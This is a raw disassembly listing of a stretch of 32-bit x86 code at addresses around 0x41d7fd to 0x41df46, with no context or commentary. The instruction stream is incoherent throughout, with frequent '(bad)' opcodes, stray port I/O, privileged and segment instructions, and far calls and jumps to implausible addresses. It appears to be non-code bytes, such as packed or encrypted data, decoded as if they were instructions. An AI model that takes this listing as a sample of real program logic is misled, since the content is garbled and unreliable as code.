  41d7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7fe:	ja     0x41d868
  41d800:	sbb    al,0xaa
  41d802:	ins    DWORD PTR es:[edi],dx
  41d803:	js     0x41d7bc
  41d805:	sub    BYTE PTR [eax+edx*1-0x76],ch
  41d809:	sbb    eax,0xcdee059e
  41d80e:	pop    ds
  41d80f:	neg    BYTE PTR [eax]
  41d811:	pop    edi
  41d812:	data16 aaa 
  41d814:	push   eax
  41d815:	cdq    
  41d816:	cmp    DWORD PTR [esi+edi*2],0xfffffff6
  41d81a:	lahf   
  41d81b:	imul   ebp,DWORD PTR [esi+ebp*2-0x5],0xea74d3d4
  41d823:	or     al,BYTE PTR [eax+ebx*2]
  41d826:	div    BYTE PTR [edx+0x3a]
  41d829:	adc    al,0xb5
  41d82b:	aam    0x53
  41d82d:	xchg   ecx,edi
  41d82f:	adc    BYTE PTR [ebx+0x5bd65cb1],al
  41d835:	xchg   ebp,eax
  41d836:	and    eax,0x97647303
  41d83b:	dec    ebp
  41d83c:	cmp    al,0xbf
  41d83e:	pushw  ss
  41d840:	jmp    0x603afbd1
  41d845:	add    dl,BYTE PTR [ecx+0x5c]
  41d848:	push   ecx
  41d849:	pop    ecx
  41d84a:	pushf  
  41d84b:	mov    ah,0x87
  41d84d:	in     al,0x3e
  41d84f:	lods   eax,DWORD PTR ds:[esi]
  41d850:	stos   DWORD PTR es:[edi],eax
  41d851:	imul   ebp,ecx,0xffffffd2
  41d854:	arpl   WORD PTR [edi-0x74ccacdd],cx
  41d85a:	cmp    al,0xda
  41d85c:	mov    ds:0xa5f3cd40,eax
  41d861:	fisub  DWORD PTR [ebp-0x6e]
  41d864:	xchg   ecx,esi
  41d866:	or     cl,BYTE PTR [ebx]
  41d868:	mov    edx,0x71b302fe
  41d86d:	ins    DWORD PTR es:[edi],dx
  41d86e:	jne    0x41d835
  41d870:	sub    DWORD PTR [ebx-0x24],edi
  41d873:	ds (bad) 
  41d875:	and    eax,0x5bce5bab
  41d87a:	xchg   BYTE PTR [ecx-0x1b6cad10],bh
  41d880:	fmul   QWORD PTR [edx+0xc34ca09]
  41d886:	fnstsw WORD PTR [eax+0x8]
  41d889:	sub    edi,esp
  41d88b:	mov    WORD PTR [edi-0x3b],?
  41d88e:	lods   eax,DWORD PTR ds:[esi]
  41d88f:	pop    edx
  41d890:	fnsave [esi+0x6cdecd0f]
  41d896:	cmp    ecx,DWORD PTR [esi]
  41d898:	xchg   edi,eax
  41d899:	ret    0x35cd
  41d89c:	popa   
  41d89d:	jle    0x41d85f
  41d89f:	in     al,0xa6
  41d8a1:	pushf  
  41d8a2:	sbb    ch,BYTE PTR [esi+0x18]
  41d8a5:	stc    
  41d8a6:	out    0x42,al
  41d8a8:	std    
  41d8a9:	mov    cl,0x9e
  41d8ab:	and    BYTE PTR [edi],0x48
  41d8ae:	jo     0x41d8c9
  41d8b0:	inc    esp
  41d8b1:	inc    eax
  41d8b2:	push   ss
  41d8b3:	mov    eax,0xcd838f4e
  41d8b8:	mov    dh,BYTE PTR [edi-0x78ecba9e]
  41d8be:	jmp    0x41d8d1
  41d8c0:	out    dx,eax
  41d8c1:	popf   
  41d8c2:	xchg   ebp,eax
  41d8c3:	int3   
  41d8c4:	xor    al,0x79
  41d8c6:	pop    ds
  41d8c7:	mov    esi,DWORD PTR [edx]
  41d8c9:	mov    esi,0x7ac866c2
  41d8ce:	(bad)  
  41d8cf:	jns    0x41d8ce
  41d8d1:	inc    ebx
  41d8d2:	cs adc al,0x32
  41d8d5:	mov    eax,ds:0xd2aacc3a
  41d8da:	mov    ds:0xbd654d66,eax
  41d8df:	lds    ecx,FWORD PTR [edx-0x4c25c355]
  41d8e5:	pop    ebx
  41d8e6:	add    ah,BYTE PTR [eax+0x1b]
  41d8e9:	sbb    bl,0xc4
  41d8ec:	sub    al,0xab
  41d8ee:	jecxz  0x41d911
  41d8f0:	and    BYTE PTR [edi],0x6b
  41d8f3:	jecxz  0x41d89a
  41d8f5:	cmp    BYTE PTR [edi-0x56],bh
  41d8f8:	dec    edx
  41d8f9:	mov    dl,0x12
  41d8fb:	mov    al,0x23
  41d8fd:	pop    edx
  41d8fe:	jp     0x41d8f0
  41d900:	jecxz  0x41d8ba
  41d902:	loop   0x41d89c
  41d904:	sbb    DWORD PTR [ecx+0x3f],0xb0e7f54d
  41d90b:	and    esi,ebx
  41d90d:	je     0x41d964
  41d90f:	or     ah,al
  41d911:	in     eax,0x98
  41d913:	ret    
  41d914:	in     al,dx
  41d915:	into   
  41d916:	(bad)  
  41d917:	fist   DWORD PTR [esi+0xb]
  41d91a:	jae    0x41d8d2
  41d91c:	mov    ecx,0x1c10e6af
  41d921:	(bad)  
  41d922:	out    dx,al
  41d923:	(bad)  
  41d924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d925:	xlat   BYTE PTR ds:[ebx]
  41d926:	xchg   esi,eax
  41d927:	mov    ebp,0xbe9af5bb
  41d92c:	popf   
  41d92d:	pop    esp
  41d92e:	clc    
  41d92f:	addr16 mov ecx,0x13d606e8
  41d935:	icebp  
  41d936:	or     esp,DWORD PTR [esi+0x2]
  41d939:	rcr    ecx,0x52
  41d93c:	fnstenv [ecx+eax*4+0x55]
  41d940:	test   DWORD PTR [ecx-0x3cb00db5],0x3e71ada4
  41d94a:	ret    
  41d94b:	sbb    cl,BYTE PTR [esp+esi*1]
  41d94e:	xchg   ebp,eax
  41d94f:	adc    bl,bh
  41d951:	inc    edi
  41d952:	dec    esi
  41d953:	inc    BYTE PTR [esi+0x5d]
  41d956:	adc    eax,DWORD PTR [ecx+ebx*4+0x51073d90]
  41d95d:	imul   eax,DWORD PTR [ecx-0x78d0c901],0xfdb9e5fd
  41d967:	sub    DWORD PTR [ebx],eax
  41d969:	test   bl,bl
  41d96b:	pop    ebp
  41d96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d96d:	xchg   ecx,eax
  41d96e:	mov    dl,0x46
  41d970:	and    eax,0x75114ec8
  41d975:	pop    edi
  41d976:	adc    eax,0x233a79e4
  41d97b:	sub    DWORD PTR [ebx+0x383624e],0xa
  41d982:	gs clc 
  41d984:	xchg   edi,eax
  41d985:	in     al,0xd3
  41d987:	xor    al,0x4a
  41d989:	fimul  DWORD PTR fs:[esi]
  41d98c:	add    al,0x8
  41d98e:	js     0x41d976
  41d990:	push   0xa937613
  41d995:	xor    bl,BYTE PTR [bp+di+0x47]
  41d999:	xchg   edx,eax
  41d99a:	mov    edx,0x9954ec75
  41d99f:	fisub  DWORD PTR [edi-0x4d2cef0c]
  41d9a5:	mov    dh,0xf9
  41d9a7:	pushf  
  41d9a8:	out    dx,eax
  41d9a9:	shl    DWORD PTR [eax],1
  41d9ab:	push   cs
  41d9ac:	pop    ebx
  41d9ad:	call   0x98b:0xd0f18449
  41d9b4:	push   esp
  41d9b5:	pop    esi
  41d9b6:	dec    edi
  41d9b7:	ja     0x41d982
  41d9b9:	imul   DWORD PTR [esi+0x4bf6c2ed]
  41d9bf:	test   eax,0x3490a3cb
  41d9c4:	fiadd  DWORD PTR [edi]
  41d9c6:	xchg   esi,eax
  41d9c7:	add    eax,0x8e2cea88
  41d9cc:	test   ah,dl
  41d9ce:	lea    ecx,[esi+0x578ea50c]
  41d9d4:	cmp    ch,BYTE PTR [edi-0x4155282c]
  41d9da:	sbb    ch,BYTE PTR [ecx-0x7f]
  41d9dd:	dec    ebp
  41d9de:	sub    DWORD PTR [ebp+0x6c],edx
  41d9e1:	fild   DWORD PTR [edi+0x2e]
  41d9e4:	jmp    0xd5eb:0xc44d4dbb
  41d9eb:	inc    esi
  41d9ec:	add    al,0xaa
  41d9ee:	add    al,0x13
  41d9f0:	xor    al,0x66
  41d9f2:	dec    edi
  41d9f3:	push   ebp
  41d9f4:	sti    
  41d9f5:	test   BYTE PTR [eax],dh
  41d9f7:	(bad)  
  41d9f8:	(bad)  
  41d9f9:	mov    eax,ds:0xf136cf8a
  41d9fe:	or     DWORD PTR [edx+0x50],ecx
  41da01:	xchg   ebx,eax
  41da02:	mov    eax,0xe96174ea
  41da07:	push   0xbedd3439
  41da0c:	fist   DWORD PTR [esi-0x57]
  41da0f:	hlt    
  41da10:	leave  
  41da11:	test   BYTE PTR [edx+0x3fdbf3bc],0xeb
  41da18:	scas   eax,DWORD PTR es:[edi]
  41da19:	clc    
  41da1a:	jmp    0x41d9c2
  41da1c:	pop    esp
  41da1d:	ins    BYTE PTR es:[edi],dx
  41da1e:	push   edi
  41da1f:	pushf  
  41da20:	stos   BYTE PTR es:[edi],al
  41da21:	cwde   
  41da22:	xor    al,0x31
  41da24:	aaa    
  41da25:	jns    0x41da20
  41da27:	mov    DWORD PTR [edx+0x40],ecx
  41da2a:	stos   DWORD PTR es:[edi],eax
  41da2b:	lahf   
  41da2c:	fwait
  41da2d:	xchg   esi,eax
  41da2e:	push   0x12
  41da30:	push   ecx
  41da31:	push   ebx
  41da32:	lods   eax,DWORD PTR ds:[esi]
  41da33:	xchg   edi,eax
  41da34:	xchg   ebx,eax
  41da35:	mov    cl,0x95
  41da37:	fs dec eax
  41da39:	shr    edx,0xfb
  41da3c:	xchg   edx,eax
  41da3d:	adc    BYTE PTR ds:0x6fdd295b,al
  41da43:	dec    esp
  41da44:	(bad)  
  41da45:	mul    DWORD PTR [ebp-0x45]
  41da48:	xchg   ebx,eax
  41da49:	rcr    BYTE PTR [ecx-0x14eb1066],0x6
  41da50:	xchg   DWORD PTR [eax],edi
  41da52:	aas    
  41da53:	dec    eax
  41da54:	rol    DWORD PTR [eax+0x48d93014],1
  41da5a:	jl     0x41daa7
  41da5c:	fs add al,0x58
  41da5f:	xor    ecx,DWORD PTR [ebp+ebp*2+0x46]
  41da63:	sahf   
  41da64:	std    
  41da65:	and    esi,DWORD PTR [esp+edx*1]
  41da68:	sar    DWORD PTR [edx-0x47424f87],cl
  41da6e:	xor    DWORD PTR [edi-0x5882bf97],edx
  41da74:	pop    esp
  41da75:	push   ss
  41da76:	adc    esp,0xfcce4968
  41da7c:	dec    eax
  41da7d:	(bad)  
  41da7e:	call   0xa2e0:0xc2dc259a
  41da85:	jns    0x41da15
  41da87:	and    eax,DWORD PTR [ebp+eax*8+0x3a]
  41da8b:	mov    al,ds:0xed261c1b
  41da90:	fidivr WORD PTR [ebx+0x55609200]
  41da96:	pushf  
  41da97:	das    
  41da98:	lahf   
  41da99:	xor    esp,DWORD PTR [eax-0x57d06fa0]
  41da9f:	mov    BYTE PTR [eax],bl
  41daa1:	sbb    al,0x78
  41daa3:	xchg   edi,eax
  41daa4:	das    
  41daa5:	loopne 0x41da69
  41daa7:	jge    0x41dae5
  41daa9:	add    dh,bh
  41daab:	cdq    
  41daac:	jle    0x41dad6
  41daae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daaf:	dec    ebx
  41dab0:	lods   eax,DWORD PTR ds:[esi]
  41dab1:	adc    al,0xa4
  41dab3:	je     0x41da64
  41dab5:	mov    ebx,0x74aff1ee
  41daba:	or     eax,0xd9ff03ce
  41dabf:	jge    0x41da71
  41dac1:	jbe    0x41db3b
  41dac3:	sub    dh,ch
  41dac5:	stos   DWORD PTR es:[edi],eax
  41dac6:	jo     0x41dade
  41dac8:	xor    DWORD PTR [ecx+0x36949df7],esi
  41dace:	lods   al,BYTE PTR ds:[esi]
  41dacf:	adc    esp,DWORD PTR [esi-0x4c]
  41dad2:	push   ds
  41dad3:	sbb    BYTE PTR [ecx+0x4489d091],cl
  41dad9:	(bad)  
  41dada:	(bad)  
  41dadb:	xlat   BYTE PTR ds:[ebx]
  41dadc:	push   esp
  41dadd:	and    al,0xdd
  41dadf:	adc    eax,0x4b67161b
  41dae4:	stc    
  41dae5:	pushf  
  41dae6:	mov    bl,0xe5
  41dae8:	cmp    BYTE PTR [edi+eiz*8],ah
  41daeb:	psllw  mm1,QWORD PTR [ecx+0x1b]
  41daef:	push   0xffffffd5
  41daf1:	aaa    
  41daf2:	into   
  41daf3:	xor    DWORD PTR [eax+eiz*4],ebx
  41daf6:	jns    0x41db66
  41daf8:	in     al,dx
  41daf9:	loopne 0x41db4c
  41dafb:	pop    ebp
  41dafc:	and    BYTE PTR [edx],al
  41dafe:	stos   DWORD PTR es:[edi],eax
  41daff:	and    DWORD PTR [ecx-0x39],0x839188b4
  41db06:	aas    
  41db07:	pop    es
  41db08:	repz sbb eax,0x4a12468d
  41db0e:	jecxz  0x41db51
  41db10:	fcomp  QWORD PTR [ecx]
  41db12:	fsubr  QWORD PTR [edi+edx*8]
  41db15:	jmp    0x3ff:0xd1d17733
  41db1c:	mov    dh,0x50
  41db1e:	in     eax,0x88
  41db20:	mov    dh,0xe6
  41db22:	or     al,0x59
  41db24:	push   es
  41db25:	xchg   ecx,eax
  41db26:	mov    dl,0xc7
  41db28:	pop    esp
  41db29:	lea    ebx,[eax+ecx*8-0x28]
  41db2d:	imul   ebp,DWORD PTR [eax-0x57],0x1
  41db31:	add    al,0x12
  41db33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db34:	mov    ds:0x81d6d3a8,al
  41db39:	sub    eax,0x1676b8c3
  41db3e:	inc    eax
  41db3f:	pop    ebp
  41db40:	clc    
  41db41:	aam    0xd8
  41db43:	aas    
  41db44:	pop    es
  41db45:	sbb    ebx,DWORD PTR [ecx+0x11]
  41db48:	xchg   edx,eax
  41db49:	push   edx
  41db4a:	add    DWORD PTR [eax*2-0xea82d3f],0xbaf30254
  41db55:	out    dx,al
  41db56:	cli    
  41db57:	cmp    dl,cl
  41db59:	mov    dh,0xb8
  41db5b:	mov    ch,0xcd
  41db5d:	jmp    0xa39be9ee
  41db62:	adc    esi,DWORD PTR [ebp-0x2df35bb2]
  41db68:	pop    edx
  41db69:	adc    ah,ch
  41db6b:	fnstenv [edx]
  41db6d:	sahf   
  41db6e:	jnp    0x41db61
  41db70:	out    dx,al
  41db71:	out    dx,al
  41db72:	jl     0x41db7b
  41db74:	and    ebx,0xffffffc0
  41db77:	dec    ebx
  41db78:	xor    al,0xc4
  41db7a:	sub    DWORD PTR [eax],ebx
  41db7c:	lods   al,BYTE PTR ds:[esi]
  41db7d:	mov    bh,0xa4
  41db7f:	imul   ebx,DWORD PTR [eax],0x27717c85
  41db85:	cwde   
  41db86:	mov    edi,0xa6d2868a
  41db8b:	(bad)  
  41db8d:	in     eax,dx
  41db8e:	repz jne 0x41db89
  41db91:	fs pop es
  41db93:	mov    bl,0xfe
  41db95:	push   ss
  41db96:	retf   
  41db97:	push   ebx
  41db98:	mov    ch,0xbd
  41db9a:	xor    al,0x1e
  41db9c:	mov    dh,0xe8
  41db9e:	adc    esi,ebx
  41dba0:	sub    eax,0xfdeb8743
  41dba5:	(bad)  
  41dba6:	fiadd  DWORD PTR [ebx+0x30]
  41dba9:	call   0xa4b4:0x79e86fd9
  41dbb0:	frstor [edx]
  41dbb2:	(bad)  
  41dbb3:	(bad)  
  41dbb5:	(bad)  
  41dbb6:	shl    BYTE PTR [edx],cl
  41dbb8:	jle    0x41db8e
  41dbba:	call   0x68bf:0x5d924f10
  41dbc1:	ins    DWORD PTR es:[edi],dx
  41dbc2:	stos   DWORD PTR es:[edi],eax
  41dbc3:	inc    esi
  41dbc4:	xchg   ebp,eax
  41dbc5:	mov    esp,0x214f9836
  41dbca:	jge    0x41dbac
  41dbcc:	adc    ah,dl
  41dbce:	sub    bh,ch
  41dbd0:	lahf   
  41dbd1:	and    DWORD PTR [ecx-0x53081c03],ebp
  41dbd7:	not    DWORD PTR [edi+0x5e1cca4e]
  41dbdd:	mov    eax,DWORD PTR [ebp-0x1f]
  41dbe0:	lods   al,BYTE PTR ds:[esi]
  41dbe1:	pop    ebp
  41dbe3:	bound  ebp,QWORD PTR ds:0x230f360d
  41dbe9:	test   eax,0xca300619
  41dbee:	scas   al,BYTE PTR es:[edi]
  41dbef:	ds fs push es
  41dbf2:	fstp   TBYTE PTR [ebx+0x5]
  41dbf5:	hlt    
  41dbf6:	test   DWORD PTR [edx-0x26bea9f],edx
  41dbfc:	push   ss
  41dbfd:	sub    DWORD PTR es:[ecx+0x680abb57],esi
  41dc04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc05:	cmp    BYTE PTR [ebp-0xfa4f791],dh
  41dc0b:	mov    WORD PTR [esi],?
  41dc0d:	push   ebx
  41dc0e:	xor    BYTE PTR [ecx-0x5f],dh
  41dc11:	pop    ecx
  41dc12:	xor    BYTE PTR [ecx-0x1d],0x20
  41dc16:	xor    al,ch
  41dc18:	xchg   edx,eax
  41dc19:	imul   eax,edx,0xffe4ac22
  41dc1f:	jmp    0x50bc0f85
  41dc24:	mov    esi,0x970b2421
  41dc29:	mov    dl,0xd4
  41dc2b:	xor    al,0xbf
  41dc2d:	mov    bl,0xd9
  41dc2f:	cmp    DWORD PTR [edi+eiz*8],esp
  41dc32:	mov    ds:0xae100a90,al
  41dc37:	inc    edi
  41dc38:	mov    bl,0xb5
  41dc3a:	ja     0x41dc68
  41dc3c:	and    eax,0x700f34c1
  41dc41:	(bad)  
  41dc42:	sbb    al,0xd5
  41dc44:	fbstp  TBYTE PTR [ecx-0x65]
  41dc47:	sub    DWORD PTR [ebx-0x502272af],edx
  41dc4d:	pushf  
  41dc4e:	bound  ebx,QWORD PTR [esp+esi*4+0x51]
  41dc52:	dec    ebp
  41dc53:	(bad)  
  41dc54:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41dc56:	jecxz  0x41dc1d
  41dc58:	xor    BYTE PTR [ebx-0x7b4f56ea],0x44
  41dc5f:	or     al,0xd
  41dc61:	lock pop esp
  41dc63:	and    eax,0xce4fde48
  41dc68:	add    al,0x5
  41dc6a:	fdiv   QWORD PTR [eax+0x2d91d683]
  41dc70:	inc    ebx
  41dc71:	push   ebx
  41dc72:	cmp    ah,BYTE PTR [ebx]
  41dc74:	inc    esp
  41dc75:	fiadd  WORD PTR [ebp-0x69]
  41dc78:	sbb    DWORD PTR [ecx-0x77],esi
  41dc7b:	dec    ebp
  41dc7c:	cmp    eax,0xd7d7ed63
  41dc81:	sub    ch,BYTE PTR [ecx+0x3a]
  41dc84:	in     al,0x83
  41dc86:	mov    DWORD PTR [ebx-0x69e5d542],esi
  41dc8c:	pop    ss
  41dc8d:	sahf   
  41dc8e:	dec    esi
  41dc8f:	xchg   esp,eax
  41dc90:	shr    eax,0x9b
  41dc93:	mov    ebx,0x4b5df55e
  41dc98:	xor    esi,ebp
  41dc9a:	mov    edx,0x6b80092d
  41dc9f:	xchg   esi,eax
  41dca0:	or     cl,ah
  41dca2:	sub    ch,BYTE PTR [ebx]
  41dca4:	cli    
  41dca5:	push   0x575fd8b1
  41dcaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcab:	bound  ecx,QWORD PTR es:[edi-0x3fb50a8a]
  41dcb2:	cmp    BYTE PTR ds:0x83fa0ee,cl
  41dcb8:	xchg   esp,eax
  41dcb9:	xchg   ebx,eax
  41dcba:	(bad)  
  41dcbb:	icebp  
  41dcbc:	retf   
  41dcbd:	ins    BYTE PTR es:[edi],dx
  41dcbe:	and    eax,0xa8603518
  41dcc3:	lods   al,BYTE PTR ds:[esi]
  41dcc4:	mov    al,ds:0xa5616490
  41dcc9:	cli    
  41dcca:	imul   esi,DWORD PTR [ebp+0x516934eb],0xffffffc6
  41dcd1:	fmul   DWORD PTR [edi]
  41dcd3:	std    
  41dcd4:	cmp    ecx,DWORD PTR [ebp-0x44]
  41dcd7:	data16 out dx,al
  41dcd9:	into   
  41dcda:	les    ebx,FWORD PTR [ebx]
  41dcdc:	jmp    0xdbe5:0xed000ab
  41dce3:	in     eax,0x3e
  41dce5:	retf   0x755b
  41dce8:	jmp    0x41dcc9
  41dcea:	xchg   ebx,eax
  41dceb:	cmp    ebx,DWORD PTR [edi-0x68]
  41dcee:	dec    eax
  41dcef:	cmp    al,0xca
  41dcf1:	mov    dl,0xd6
  41dcf3:	and    dl,BYTE PTR [edx+esi*4]
  41dcf6:	cmp    ebx,DWORD PTR [edx]
  41dcf8:	jg     0x41dcd5
  41dcfa:	es loop 0x41dd23
  41dcfd:	mov    DWORD PTR [esi+0x43],ecx
  41dd00:	lds    eax,FWORD PTR [ebp+0x19]
  41dd03:	sbb    ch,ch
  41dd05:	pop    ecx
  41dd06:	clc    
  41dd07:	mov    dl,0x88
  41dd09:	daa    
  41dd0a:	pop    ecx
  41dd0b:	xchg   ebp,eax
  41dd0c:	aaa    
  41dd0d:	repnz nop
  41dd0f:	lods   al,BYTE PTR ds:[esi]
  41dd10:	inc    ebx
  41dd11:	push   esi
  41dd12:	or     edi,ebx
  41dd14:	mov    ch,0xba
  41dd16:	int    0x98
  41dd18:	cmp    DWORD PTR [eax+0xc],esi
  41dd1b:	loope  0x41dd1f
  41dd1d:	or     ebx,DWORD PTR [edx-0x697910cd]
  41dd23:	inc    edx
  41dd24:	push   esi
  41dd25:	(bad)  
  41dd26:	sub    BYTE PTR ds:[ebx],bh
  41dd29:	xor    ebp,eax
  41dd2b:	rol    al,1
  41dd2d:	mov    esp,ebx
  41dd2f:	xchg   ebp,eax
  41dd30:	sub    BYTE PTR [ecx],cl
  41dd32:	sub    edi,DWORD PTR [ebp+0x3f614f34]
  41dd38:	mov    DWORD PTR [esi-0x2f],ebp
  41dd3b:	mov    al,ds:0x6bb345f8
  41dd40:	cmc    
  41dd41:	mov    ss,WORD PTR [edi+0x25d10163]
  41dd47:	not    BYTE PTR [ebx-0x7be74305]
  41dd4d:	setl   BYTE PTR [ebx+0x5e]
  41dd51:	inc    ebx
  41dd52:	and    cl,BYTE PTR [eax-0x6892856b]
  41dd58:	fidiv  WORD PTR [ecx*2+0x28f94b61]
  41dd5f:	ins    DWORD PTR es:[edi],dx
  41dd60:	dec    edx
  41dd61:	mov    esp,0x64967419
  41dd66:	dec    esp
  41dd67:	ins    DWORD PTR es:[edi],dx
  41dd68:	(bad)  
  41dd69:	ror    DWORD PTR [ebp+0x19],cl
  41dd6c:	adc    DWORD PTR [edi],eax
  41dd6e:	sar    BYTE PTR [eax+0x7f],1
  41dd71:	xchg   ebp,eax
  41dd72:	(bad)  
  41dd74:	sbb    dl,bl
  41dd76:	sub    esp,DWORD PTR [ebp+0x24]
  41dd79:	mov    cl,0xd6
  41dd7b:	lock ret 0x1d83
  41dd7f:	xchg   edi,eax
  41dd80:	inc    edi
  41dd81:	or     edi,DWORD PTR [edi]
  41dd83:	push   0xfd644245
  41dd88:	bound  eax,QWORD PTR [edi]
  41dd8a:	inc    edi
  41dd8b:	(bad)
  41dd8e:	retf   0x69c4
  41dd91:	enter  0x7c4c,0xca
  41dd95:	cmp    dh,BYTE PTR [eax+eiz*8+0x51]
  41dd99:	mov    eax,ds:0xb0d0d823
  41dd9e:	imul   esp,DWORD PTR [ecx+ebp*4+0x58],0x5e
  41dda3:	mov    dh,0x3d
  41dda5:	pop    ds
  41dda6:	icebp  
  41dda7:	add    ebp,ebp
  41dda9:	mov    ebp,0x78b543dd
  41ddae:	fs dec esp
  41ddb0:	pushf  
  41ddb1:	push   ebp
  41ddb2:	aam    0xbd
  41ddb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddb5:	in     al,dx
  41ddb6:	jae    0x41ddd2
  41ddb8:	or     DWORD PTR [ebx-0x49],0xffffff88
  41ddbc:	cmp    ebx,DWORD PTR [ebx]
  41ddbe:	push   esi
  41ddbf:	inc    edx
  41ddc0:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41ddc2:	lea    ecx,[eax-0x5f]
  41ddc5:	out    0xdc,eax
  41ddc7:	jo     0x41dd89
  41ddc9:	or     BYTE PTR [esi],0x43
  41ddcc:	neg    cl
  41ddce:	out    0xa5,al
  41ddd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddd1:	push   esi
  41ddd2:	and    esi,ecx
  41ddd4:	jno    0x41dd65
  41ddd6:	lods   eax,DWORD PTR ds:[esi]
  41ddd7:	sbb    BYTE PTR [ebx-0x726dffdb],bh
  41dddd:	xchg   BYTE PTR [ecx+edx*4],dh
  41dde0:	mov    dh,bl
  41dde2:	ror    DWORD PTR [edi+0x9],cl
  41dde5:	jno    0x41ddf1
  41dde7:	and    al,0x39
  41dde9:	(bad)  
  41ddea:	ss mov ebp,0x2521f944
  41ddf0:	cld    
  41ddf1:	out    dx,al
  41ddf2:	fnstsw WORD PTR [ebp+0x6c]
  41ddf5:	das    
  41ddf6:	dec    eax
  41ddf7:	test   ah,ch
  41ddf9:	xchg   esi,eax
  41ddfa:	lods   al,BYTE PTR ds:[esi]
  41ddfb:	into   
  41ddfc:	push   ds
  41ddfd:	(bad)  
  41ddfe:	mov    ah,0x99
  41de00:	jnp    0x41de21
  41de02:	call   0xed9b:0x2ea314c4
  41de09:	dec    ebp
  41de0a:	xor    bl,dl
  41de0c:	or     BYTE PTR [eax],dh
  41de0e:	jnp    0x41de02
  41de10:	stos   DWORD PTR es:[edi],eax
  41de11:	mov    WORD PTR [eax],es
  41de13:	sbb    dl,BYTE PTR [edx]
  41de15:	jb     0x41de25
  41de17:	jl     0x41de3b
  41de19:	cld    
  41de1a:	add    DWORD PTR [eax+0x4b10b08a],eax
  41de20:	repz hlt 
  41de22:	cmc    
  41de23:	das    
  41de24:	cld    
  41de25:	les    esi,FWORD PTR [edx-0x6ae1c34]
  41de2b:	pop    esi
  41de2c:	aad    0x61
  41de2e:	push   ebx
  41de2f:	aad    0xa7
  41de31:	mov    DWORD PTR [eax],esi
  41de33:	push   esp
  41de34:	mov    edx,0x3cbc7d8f
  41de39:	aaa    
  41de3a:	inc    esi
  41de3b:	mov    eax,ds:0x6d93e48b
  41de40:	push   es
  41de41:	pop    ecx
  41de42:	sub    cl,BYTE PTR [edx]
  41de44:	sbb    BYTE PTR [edi],dl
  41de46:	mov    bl,0x9a
  41de48:	shl    BYTE PTR [ecx-0x61d60929],1
  41de4e:	popf   
  41de4f:	adc    eax,DWORD PTR [edi]
  41de51:	int3   
  41de52:	xor    ah,bh
  41de54:	jbe    0x41deb9
  41de56:	xchg   ebp,eax
  41de57:	mov    ebx,0x29defd06
  41de5c:	gs jno 0x41de4e
  41de5f:	in     eax,dx
  41de60:	and    bl,dh
  41de62:	dec    esp
  41de63:	or     DWORD PTR [ecx-0x2f5c7d4c],esp
  41de69:	push   esi
  41de6a:	jb     0x41ddff
  41de6c:	ja     0x41de8b
  41de6e:	adc    eax,edx
  41de70:	cli    
  41de71:	mov    edi,0x76c01378
  41de76:	add    BYTE PTR [esi],ch
  41de78:	adc    DWORD PTR [ecx+0x1c2426a2],esp
  41de7e:	je     0x41de09
  41de80:	(bad)  
  41de81:	xchg   ebp,eax
  41de82:	icebp  
  41de83:	je     0x41de31
  41de85:	out    dx,al
  41de86:	std    
  41de87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de88:	xchg   esp,eax
  41de89:	cmp    DWORD PTR [ebx+edi*8-0x50],edx
  41de8d:	add    eax,0xb69ee967
  41de92:	out    0x53,eax
  41de94:	sub    BYTE PTR [ebp+eax*4-0x3b],al
  41de98:	cmp    DWORD PTR [ecx],edx
  41de9a:	jbe    0x41def9
  41de9c:	pop    ds
  41de9d:	cmp    ebx,DWORD PTR [edx]
  41de9f:	sbb    eax,0x8d4a92dd
  41dea4:	adc    DWORD PTR [ebp-0x504b2270],eax
  41deaa:	and    dl,ch
  41deac:	call   0x6ec6cabb
  41deb1:	retf   0xfa4a
  41deb4:	mov    edx,0x2dd6768
  41deb9:	add    ecx,0x5d
  41debc:	pop    edx
  41debd:	pop    esi
  41debe:	pop    edi
  41debf:	lods   al,BYTE PTR ds:[esi]
  41dec0:	cmp    al,0x80
  41dec2:	ret    0xdc0f
  41dec5:	aad    0x48
  41dec7:	and    al,0x68
  41dec9:	jmp    0x41defa
  41decb:	sbb    BYTE PTR [ecx-0x42dc6a3d],dh
  41ded1:	or     dh,BYTE PTR [ebx+0x6d]
  41ded4:	jle    0x41deae
  41ded6:	adc    BYTE PTR [esi],ch
  41ded8:	mov    eax,0xeb86fbd
  41dedd:	fwait
  41dede:	jnp    0x41df5a
  41dee0:	jmp    0xb8abee05
  41dee5:	clc    
  41dee6:	sbb    edx,DWORD PTR [eax+0x6a3c7f5c]
  41deec:	scas   al,BYTE PTR es:[edi]
  41deed:	add    al,0x2f
  41deef:	mov    ds:0x9456b765,al
  41def4:	int    0xd9
  41def6:	xchg   DWORD PTR [eax+0x2e],eax
  41def9:	inc    esp
  41defa:	rol    DWORD PTR [bp+si-0x5eeb],0xe0
  41df00:	mov    ah,0x18
  41df02:	mov    ah,0x5
  41df04:	ins    DWORD PTR es:[edi],dx
  41df05:	lock pop eax
  41df07:	lahf   
  41df08:	test   BYTE PTR [edx-0x5ac56e6e],ah
  41df0e:	clc    
  41df0f:	in     al,0x73
  41df11:	call   0xf07:0xa350d48f
  41df18:	push   esi
  41df19:	add    dl,al
  41df1b:	jnp    0x41deb4
  41df1d:	inc    ecx
  41df1e:	xor    dh,BYTE PTR [esi-0x8]
  41df21:	gs loop 0x41df85
  41df24:	jns    0x41df68
  41df26:	push   ebp
  41df27:	pop    ebp
  41df28:	cmp    BYTE PTR [ecx],bh
  41df2a:	js     0x41df8a
  41df2c:	dec    esi
  41df2d:	(bad)  
  41df2e:	leave  
  41df2f:	add    DWORD PTR [eax+0x63b65845],esp
  41df35:	scas   al,BYTE PTR es:[edi]
  41df36:	mov    eax,0x623b714c
  41df3b:	xor    eax,DWORD PTR [edi+0x1e0aa949]
  41df41:	mov    ebx,0xd3715ae1
  41df46:	cmp    DWORD PTR [ebx-0x6c],ebp
